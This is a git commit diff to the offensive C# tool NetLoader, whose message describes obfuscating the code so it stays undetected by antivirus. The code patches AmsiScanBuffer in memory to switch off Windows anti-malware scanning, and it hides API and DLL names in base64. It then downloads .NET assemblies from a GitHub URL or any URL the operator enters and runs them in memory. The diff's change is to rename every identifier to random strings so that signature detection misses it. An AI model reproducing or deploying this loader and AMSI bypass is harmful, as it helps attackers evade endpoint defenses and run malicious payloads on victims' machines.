a570f4812cfef04099a77b2e4f3e09e5e3a61010
Flangvik <skiddie@tutanota.com>
2020-06-03 01:10:36 +0200

    ReFud. Ended up writing a tiny C# code obfuscator, hopefully a step closer to automatic re-fud

--- Source/Program.cs
+++ Source/Program.cs
@@ -10,158 +10,163 @@ using System.Text.RegularExpressions;
 //This if for MSBuild LOL bin stuff later
 //using Microsoft.Build.Framework;
 //using Microsoft.Build.Utilities;
-public class TotallyNotNt
-{
+public class xorimgplghusk{
+    private static WebClient qoxkbdjujvgvjm = new WebClient() { };
 	[DllImport("ker" +"nel" + "32")]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("ker" +"nel" + "32")]
-    private static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("ker" +"nel" + "32")]
-    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-	
-    static WebClient leaveMeAlone = new WebClient() { };
-
- private static void RiddleMeThis(MethodInfo methodHolder, object[] dataArgs = null ){
-	//methodHolder.Invoke(null, new object[] { new string[] { arguments } });
-	methodHolder.Invoke(0, dataArgs);
+    private static extern IntPtr GetProcAddress(IntPtr cnttrrp, string eduqlksc);
+	[DllImport("ker" +"nel" + "32")]
+    private static extern IntPtr LoadLibrary(string tjne);
+	[DllImport("ker" +"nel" + "32")]
+    private static extern bool VirtualProtect(IntPtr aafqwlmfk, UIntPtr byalip, uint hbdpfwgtapjd, out uint aevexbxohxxxhe);
+	private static void fsnuhafso(byte[] xaznuhjef, IntPtr halbpuufaftund, int squatwlzs = 0)
+    {
+        Marshal.Copy(xaznuhjef, squatwlzs, halbpuufaftund, xaznuhjef.Length);
+    }
+	public static byte[] FetchMe(string ina){
+		return qoxkbdjujvgvjm.DownloadData(ina);
+	}
+	private static void tipuhkzlzzxke(MethodInfo ledfuecvkaqt, object[] ihtheami = null ){
+	//ledfuecvkaqt.Invoke(null, new object[] { new string[] { kfhhhitjx } });
+	ledfuecvkaqt.Invoke(0, ihtheami);
 }
-	
-    public static void Main(string[] args)
+	public static void ynrzrkslcvdgbuu(string wkmhvsr, string kfhhhitjx = "", string gxzhqhuii = "", bool cljpzosrsyd = true)
+    {		var lwyxgocoh = new object[] { new string[] { kfhhhitjx } };
+        if (!cljpzosrsyd)
+        {
+            if (!gxzhqhuii.StartsWith("http"))
+            {
+                tipuhkzlzzxke(rjqkdzg(Assembly.Load(File.ReadAllBytes(gxzhqhuii))),lwyxgocoh);
+			}
+            else
+            {
+                tipuhkzlzzxke(rjqkdzg(Assembly.Load(FetchMe(gxzhqhuii))),lwyxgocoh);
+			}
+		}	
+        else
+        {
+			tipuhkzlzzxke(rjqkdzg(Assembly.Load(FetchMe(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + wkmhvsr + "?raw=true"))),lwyxgocoh);
+	    }
+    }
+	private static List<string> GetBins()
+    {
+        var uyaoawtawr = new List<string>() { };
+        var cynepigdwcmcn = qoxkbdjujvgvjm.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));
+        Regex htb = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
+        foreach (var match in htb.Matches(cynepigdwcmcn))
+        {
+            uyaoawtawr.Add(match.ToString().TrimStart('/'));
+        }
+        return uyaoawtawr;
+    }
+	public static void Main(string[] args)
     {
         Console.WriteLine("[!] ~Flangvik  #NetLoader");
-        MoveLifeAhead();
-
+        slnduvcrnmilep();
         while (true)
         {
             try
             {
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-
                 if (args.Length == 0)
                 {
-                    List<string> binList = GetBins();
-
+                    List<string> zwqqubc = GetBins();
                     Console.WriteLine("[+] Select a binary (number)>");
                     Console.WriteLine("------------------------");
                     Console.WriteLine("[0] - Exit NetLoader");
-                    for (int goodGuyNumber = 0; goodGuyNumber < binList.Count; goodGuyNumber++)
+                    for (int pgpbnhvhirznt = 0; pgpbnhvhirznt < zwqqubc.Count; pgpbnhvhirznt++)
                     {
-                        Console.WriteLine("[" + (goodGuyNumber + 1) + "] - " + binList[goodGuyNumber]);
-
-                        if (goodGuyNumber == binList.Count - 1)
+                        Console.WriteLine("[" + (pgpbnhvhirznt + 1) + "] - " + zwqqubc[pgpbnhvhirznt]);
+                        if (pgpbnhvhirznt == zwqqubc.Count - 1)
                         {
-                            Console.WriteLine("[" + (goodGuyNumber + 2) + "] - Custom PATH or URL ");
+                            Console.WriteLine("[" + (pgpbnhvhirznt + 2) + "] - Custom PATH or URL ");
                         }
                     }
                     Console.WriteLine("-----------------------");
-
-                    var rawInput = Console.ReadLine();
-
-                    if (Convert.ToInt32(rawInput) == 0)
+                    var hwbfedhi = Console.ReadLine();
+                    if (Convert.ToInt32(hwbfedhi) == 0)
                     {
                         System.Environment.Exit(1);
-
                     }
-                    else if (Convert.ToInt32(rawInput) - 1 == binList.Count)
+                    else if (Convert.ToInt32(hwbfedhi) - 1 == zwqqubc.Count)
                     {
                         Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
-                        string binUrl = Console.ReadLine();
-
-                        Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
-                        string binArgs = Console.ReadLine();
-                        leaveThisAlone("", binArgs, binUrl, false);
-
-
-
+                        string kckovd = Console.ReadLine();
+                        Console.WriteLine("[+] Provide kfhhhitjx for {0} >", kckovd);
+                        string somfify = Console.ReadLine();
+                        ynrzrkslcvdgbuu("", somfify, kckovd, false);
                     }
-                    else if (Convert.ToInt32(rawInput) - 1 > binList.Count | Convert.ToInt32(rawInput) - 1 < 0)
+                    else if (Convert.ToInt32(hwbfedhi) - 1 > zwqqubc.Count | Convert.ToInt32(hwbfedhi) - 1 < 0)
                     {
                         Console.WriteLine("[!] Bad Input, sry!");
                     }
                     else
                     {
-                        Console.WriteLine("[+] Provide arguments for {0} >", binList[Convert.ToInt32(rawInput) - 1]);
-                        string binArgs = Console.ReadLine();
-                        leaveThisAlone(binList[Convert.ToInt32(rawInput) - 1], binArgs);
-
+                        Console.WriteLine("[+] Provide kfhhhitjx for {0} >", zwqqubc[Convert.ToInt32(hwbfedhi) - 1]);
+                        string somfify = Console.ReadLine();
+                        ynrzrkslcvdgbuu(zwqqubc[Convert.ToInt32(hwbfedhi) - 1], somfify);
                     }
                 }
                 else
                 {
-
-                    string payloadPath = "";
-                    string payloadArgs = "";
-                    bool base64Decode = false;
-
+                    string zfthxcydvlm = "";
+                    string ruufdfmsedt = "";
+                    bool wmrhvcieyndf = false;
                     foreach (var argument in args)
                     {
                         if (argument.ToLower().Contains("path"))
                         {
-                            var argData = Array.IndexOf(args, argument) + 1;
-                            if (argData < args.Length)
+                            var jfjcrte = Array.IndexOf(args, argument) + 1;
+                            if (jfjcrte < args.Length)
                             {
-                                var rawPayload = args[Array.IndexOf(args, argument) + 1];
-                                if (base64Decode)
-                                    payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
+                                var osasrlezkr = args[Array.IndexOf(args, argument) + 1];
+                                if (wmrhvcieyndf)
+                                    zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(osasrlezkr));
                                 else
-                                    payloadPath = rawPayload;
+                                    zfthxcydvlm = osasrlezkr;
                             }
-
                         }
-
                         if (argument.ToLower().Contains("b64"))
-                            base64Decode = true;
-
+                            wmrhvcieyndf = true;
                         if (argument.ToLower().Contains("args"))
                         {
-                            var argData = Array.IndexOf(args, argument) + 1;
-                            if (argData < args.Length)
+                            var jfjcrte = Array.IndexOf(args, argument) + 1;
+                            if (jfjcrte < args.Length)
                             {
-
-                                var rawPayloadArgs = args[Array.IndexOf(args, argument) + 1];
-                                if (base64Decode)
-                                    payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
+                                var osasrlezkrArgs = args[Array.IndexOf(args, argument) + 1];
+                                if (wmrhvcieyndf)
+                                    ruufdfmsedt = Encoding.UTF8.GetString(Convert.FromBase64String(osasrlezkrArgs));
                                 else
-                                    payloadArgs = rawPayloadArgs;
+                                    ruufdfmsedt = osasrlezkrArgs;
                             }
                         }
                     }
-
-                    if (args.Length == 1 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
+                    if (args.Length == 1 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && !wmrhvcieyndf)
                     {
-                        payloadPath = args[0];
+                        zfthxcydvlm = args[0];
                     }
-
-                    if (args.Length == 2 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && !base64Decode)
+                    if (args.Length == 2 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && !wmrhvcieyndf)
                     {
-                        payloadArgs = args[1];
-                        payloadPath = args[0];
+                        ruufdfmsedt = args[1];
+                        zfthxcydvlm = args[0];
                     }
-
-                    if (args.Length == 3 && string.IsNullOrEmpty(payloadArgs) && string.IsNullOrEmpty(payloadPath) && base64Decode)
+                    if (args.Length == 3 && string.IsNullOrEmpty(ruufdfmsedt) && string.IsNullOrEmpty(zfthxcydvlm) && wmrhvcieyndf)
                     {
-                        payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
-                        payloadArgs = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
+                        zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
+                        ruufdfmsedt = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                     }
-
-                    if (args.Length == 2 && base64Decode)
+                    if (args.Length == 2 && wmrhvcieyndf)
                     {
                         if (!string.IsNullOrEmpty(args[1]))
-                            payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
+                            zfthxcydvlm = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                     }
-
-                    if (!string.IsNullOrEmpty(payloadPath))
+                    if (!string.IsNullOrEmpty(zfthxcydvlm))
                     {
-                        Console.WriteLine("[+] Starting {0} with args {1}", payloadPath, payloadArgs);
-                        leaveThisAlone("", payloadArgs, payloadPath, false);
+                        Console.WriteLine("[+] Starting {0} with args {1}", zfthxcydvlm, ruufdfmsedt);
+                        ynrzrkslcvdgbuu("", ruufdfmsedt, zfthxcydvlm, false);
                         Environment.Exit(0);
                     }
-
                     Environment.Exit(0);
                 }
-
             }
             catch (Exception ex)
             {
@@ -171,117 +176,48 @@ public class TotallyNotNt
             }
         }
     }
-
-
-    private static MethodInfo testMe(Assembly asm)
-    {
-		if(1 == 1)
-			return asm.EntryPoint;
-		
-		return null;
-	}
-
-
-	
-	
-    private static List<string> GetBins()
-    {
-
-        var avBinaries = new List<string>() { };
-        var websiteSource = leaveMeAlone.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));
-
-        Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
-        foreach (var match in rgx.Matches(websiteSource))
-        {
-            avBinaries.Add(match.ToString().TrimStart('/'));
-        }
-
-        return avBinaries;
-
-    }
-
-
-
-    private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
-    {
-        Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
-    }
-    private static void MoveLifeAhead(bool BigBoy = false)
+	private static void slnduvcrnmilep(bool jqgevq = false)
     {
         try
         {
-            var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
-            IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
-            uint magicRastaValue = 0x40;
-
-            uint someNumber = 0;
-
+            var ntewtz = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
+            IntPtr poza = GetProcAddress(ntewtz, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
+            uint ujgmnptptxdijei = 0x40;
+            uint hdrqslsvyj = 0;
             if (System.Environment.Is64BitOperatingSystem)
             {
-                var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
-
-                VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
-
-                CopyData(bigBoyBytes, addr);
-
+                var awzxcizepow = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                VirtualProtect(poza, (UIntPtr)awzxcizepow.Length, ujgmnptptxdijei, out hdrqslsvyj);
+                fsnuhafso(awzxcizepow, poza);
             }
             else
             {
-                var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-
-
-                VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
-
-                CopyData(smallBoyBytes, addr);
-
-
-
+                var xkpwjxovxekzo = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+                VirtualProtect(poza, (UIntPtr)xkpwjxovxekzo.Length, ujgmnptptxdijei, out hdrqslsvyj);
+                fsnuhafso(xkpwjxovxekzo, poza);
             }
                 Console.WriteLine("[+] Patched!");
-
         }
         catch (Exception ex)
         {
             Console.WriteLine("[!] {0}", ex.Message);
-
         }
     }
-	public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
-    {		var argHolder = new object[] { new string[] { arguments } };
-	
-        if (!randomStuff)
-        {
-            if (!customUrl.StartsWith("http"))
-            {
-                RiddleMeThis(testMe(Assembly.Load(File.ReadAllBytes(customUrl))),argHolder);
-			}
-            else
-            {
-                RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl))),argHolder);
-			}
-		}	
-        else
-        {
-			RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + binName + "?raw=true"))),argHolder);
-	    }
-	
-    }
-
-}
-
-
-   
-
-
-/*
- //This is for MSBuild later
-public class ClassExample : Task, ITask
-{
-    public override bool Execute()
+	private static MethodInfo rjqkdzg(Assembly mbo)
     {
-        TotallyNotNt.Main(new string[] { });
-        return true;
-    }
+		if(1 == 1)
+			return mbo.EntryPoint;
+		return null;
+	}
+	/*
+	 //This is for MSBuild later
+	public class ClassExample : Task, ITask
+	{
+	    public override bool Execute()
+	    {
+	        xorimgplghusk.Main(new string[] { });
+	        return true;
+	    }
+	}
+	*/
 }
-*/
